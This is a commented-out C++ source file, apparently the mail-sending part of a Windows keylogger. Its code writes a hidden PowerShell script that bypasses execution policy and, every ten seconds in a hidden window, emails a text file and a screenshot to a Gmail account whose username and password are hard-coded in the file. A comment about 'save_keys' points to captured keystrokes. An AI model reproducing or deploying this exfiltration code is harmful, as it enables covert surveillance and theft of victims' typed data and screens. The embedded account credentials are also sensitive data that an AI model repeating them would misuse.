//#include "MailSender.h"
//
//#include <iostream>
//#include <windows.h>
//#include <fstream>
//
//MailSender::MailSender()
//{
//    CreateScript();
//}
//
//void MailSender::Run()
//{
//    // save_keys is run as a thread as long as the process is alive.
//    // thread.join is not needed !!!!
//
//    std::thread{&MailSender::SendMails, this}.detach();
//}
//
//void MailSender::SendMails()
//{
//    for(ever)
//    {
//        SendMail();
//
//        Sleep(1000 * 10);
//    }
//}
//
//void MailSender::SendMail()
//{
//    std::string script = "powershell -executionPolicy bypass -file \"sm.ps1\"";
//
//    ShellExecuteA(NULL, NULL, "powershell", script.c_str(), NULL, SW_HIDE);
//}
//
//void MailSender::CreateScript()
//{
//    string script =
//    "\
//$SMTPServer = \"smtp.gmail.com\"\n\
//$SMTPPort = \"587\"\n\
//$Username = \"opawallak@gmail.com\"\n\
//$Password = \"232323wallakata\"\n\
//$to = \"opawallak@gmail.com\"\n\
//$subject = \"Email Subject\"\n\
//$body = \"Insert body text here\"\n\
//$attachment = \"wallak.txt\"\n\
//$attachment2 = \"screen.jpg\"\n\
//$message = New-Object System.Net.Mail.MailMessage\n\
//$message.subject = $subject\n\
//$message.body = $body\n\
//$message.to.add($to)\n\
//$message.from = $username\n\
//$message.attachments.add($attachment)\n\
//$message.attachments.add($attachment2)\n\
//$smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort)\n\
//$smtp.EnableSSL = $true\n\
//$smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)\n\
//$smtp.send($message)\n\
//    ";
//
//    std::fstream file;
//    file.open( "sm.ps1", std::ios::out );
//    file << script;
//    file.close();
//
//    SetFileAttributes("sm.ps1", FILE_ATTRIBUTE_HIDDEN);
//}
